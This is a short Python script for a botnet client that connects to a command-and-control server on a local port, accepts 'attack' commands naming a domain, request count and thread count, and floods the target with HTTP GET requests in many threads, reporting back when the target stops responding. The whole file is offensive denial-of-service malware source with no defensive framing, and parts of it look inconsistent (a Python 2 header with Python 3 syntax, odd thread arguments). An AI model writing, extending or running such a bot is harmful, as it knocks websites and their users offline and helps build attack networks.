#!/usr/bin/python2
#coding=utf-8
import socket
import threading
import requests
import os
import subprocess
import asyncio
import time
from time import sleep

#### colours ####
# B='\033[1;94m'
# R='\033[1;91m'
# G='\033[1;92m'
# W='\033[1;97m'
# S='\033[1;96m'
# P='\033[1;95m'
# Y='\033[1;93m'
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
b='\033[1;34m'
d='\033[1;37m'
w='\033[0m'
W='\033[1;47m'
D='\033[2;00m'

   
host = "127.0.0.1" 
Hilos = []
 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

connected = False
def listener():
    print("\n\n")
    print("\033[1;97m[☢] \033[1;91mListening connection from CnC......")
    while True:
        try:
            s.connect((host, 4445))  
            break
             

        except:
            time.sleep(2)


def attack(data, *args): 
    data = f"{data}{''.join(i for i in args)}"
    domain = data.split(" ")[1]
    packets = int(data.split(" ")[2])
    port = 80  
    reqs = 0

    
    for i in range(packets):
        try:
            reqs += 1  
            requests.get(f"http://{domain}:{port}")
             

        except:
            s.send(f"\033[1;92m[☢] {domain} Is not responding, it seems the targeted host is down, the attack has probably been successful".encode())
            pass
 

def main():
    while True:
        try:
            s.connect((host, 4445))
        except:
            pass
        data = s.recv(1024)
        data = data.decode('utf-8').replace("\r\n", "")
          

        if data.startswith("attack"):

            workers = int(data.split(" ")[3])
            for i in range(workers):
                t = threading.Thread(target=attack, args=data)
                Hilos.append(t)
                t.start()
            for hilo in Hilos:
                hilo.join()

        
        if data.startswith("exit"):
            s.close() 
            listener()
            

        try:
            s.connect((host, 4445))
        except:
            pass

     

if __name__ == '__main__':
    while True:
        listener()
        main()    
    

   
        
